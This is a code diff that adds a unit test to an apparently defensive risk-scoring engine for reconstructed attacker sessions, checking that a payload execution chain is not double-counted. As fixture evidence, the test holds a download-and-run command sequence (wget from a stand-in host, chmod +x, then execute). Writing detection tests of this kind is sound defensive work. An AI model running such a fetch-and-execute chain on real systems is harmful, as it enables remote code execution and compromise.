@@ -236,3 +236,44 @@ def test_complete_assessment_combines_multiple_intelligence_sources():
     }
 
     assert "network_attribution" in factor_names
+
+
+def test_payload_execution_chain_avoids_double_counting_components():
+    session = ReconstructedSession(session_id="sequence-session")
+
+    intents = [
+        IntentResult(
+            intent="payload_retrieval",
+            confidence=0.5,
+            evidence=["wget http://example.test/payload"],
+        ),
+        IntentResult(
+            intent="execution",
+            confidence=0.5,
+            evidence=["chmod +x payload", "./payload"],
+        ),
+        IntentResult(
+            intent="payload_execution_chain",
+            confidence=0.85,
+            evidence=[
+                "wget http://example.test/payload",
+                "chmod +x payload",
+                "./payload",
+            ],
+            phase="execution",
+        ),
+    ]
+
+    assessment = RiskScoringEngine().assess(
+        session=session,
+        intents=intents,
+    )
+
+    assert assessment.score == 30
+    assert assessment.factor_count() == 1
+    assert assessment.factors[0].name == "intent_payload_execution_chain"
+    assert assessment.factors[0].evidence == [
+        "wget http://example.test/payload",
+        "chmod +x payload",
+        "./payload",
+    ]
